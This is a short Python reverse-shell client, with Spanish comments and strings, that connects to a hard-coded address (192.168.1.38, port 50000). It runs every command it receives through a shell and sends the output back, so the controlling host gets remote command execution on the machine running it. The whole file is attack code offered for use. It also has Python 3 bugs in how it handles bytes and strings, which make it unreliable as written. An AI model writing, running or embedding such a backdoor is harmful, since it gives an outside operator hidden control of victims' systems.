#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import subprocess
import threading

cliente = socket.socket()
	
try:
	cliente.connect(('192.168.1.38',50000))
	cliente.send("1".encode('utf-8'))

	while True:
		c = cliente.recv(1024).decode('utf-8')
		if(c):
			print("\nEjecutando: {}".format(c))
			comando = subprocess.Popen(c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
			if(comando.stderr.read() != ""):
				cliente.send("Error")
			else:
				cliente.send(comando.stdout.read())
		else:
			cliente.close()
except Exception as e:
	print("<<NO CONECTADO>>", e)
	
